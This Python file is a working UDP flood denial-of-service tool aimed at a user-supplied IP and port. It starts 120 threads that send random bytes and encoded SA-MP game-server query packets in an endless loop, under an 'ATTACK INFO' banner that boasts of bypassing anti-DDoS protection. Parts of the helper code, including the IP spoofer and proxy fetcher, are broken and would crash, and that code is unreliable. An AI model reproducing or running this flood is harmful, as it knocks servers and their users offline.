import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]


referers = [
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz'
     'Your_Server_Bypassed_By_ArapXyz'
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz',
     'Your_Server_Bypassed_By_ArapXyz'
     'Your_Server_Bypassed_By_ArapXyz']

refers = [
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ'
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ',
     'ANTIDDOS_BYPASSED_BY_ARAPXYZ']

os.system("clear")
print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m")
print ("[38;2;255;0;255m║ [1;37mATTACK INFO")
print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m")
print ("[38;2;255;0;255m║ [38;2;255;0;255mI[38;2;219;36;255mP[38;2;183;72;255mH[38;2;147;108;255mO[38;2;111;144;255mS[38;2;75;180;255mT[38;2;39;216;255m     [1;31m> [1;34m[[1;32m%s[1;34m] "%(ip))
print ("[38;2;255;0;255m║ [38;2;255;0;255mP[38;2;204;51;255mO[38;2;153;102;255mR[38;2;102;153;255mT[38;2;51;204;255m       [1;31m> [1;34m[[1;32m%s[1;34m]"%(port))
print ("[38;2;255;0;255m║ [38;2;255;0;255mM[38;2;219;36;255mE[38;2;183;72;255mT[38;2;147;108;255mH[38;2;111;144;255mO[38;2;75;180;255mD[38;2;39;216;255m     [1;31m> [1;34m[[1;32m UDP[1;34m] ")
print ("[38;2;255;0;255m║ [38;2;255;0;255mD[38;2;227;28;255mU[38;2;199;56;255mR[38;2;171;84;255mA[38;2;143;112;255mT[38;2;115;140;255mI[38;2;87;168;255mO[38;2;59;196;255mN[38;2;31;224;255m   [1;31m> [1;34m[[1;32m60[1;34m] ")
print ("[38;2;255;0;255m║ [38;2;255;0;255mV[38;2;230;25;255mI[38;2;205;50;255mP[38;2;180;75;255m [38;2;155;100;255mP[38;2;130;125;255mO[38;2;105;150;255mW[38;2;80;175;255mE[38;2;55;200;255mR[38;2;30;225;255m  [1;31m> [1;34m[16748GBPS[1;34m] ")
print ("[38;2;255;0;255m═[38;2;249;6;255m═[38;2;243;12;255m═[38;2;237;18;255m═[38;2;231;24;255m═[38;2;225;30;255m═[38;2;219;36;255m═[38;2;213;42;255m═[38;2;207;48;255m═[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m═[38;2;45;210;255m═[38;2;39;216;255m═[38;2;33;222;255m═[38;2;27;228;255m═[38;2;21;234;255m ")



def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        getproxy()
        askthreads()
    else:
        proxyask()  

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1021)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))
                
  
if __name__ == '__main__':
    try:
        for x in range(120):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
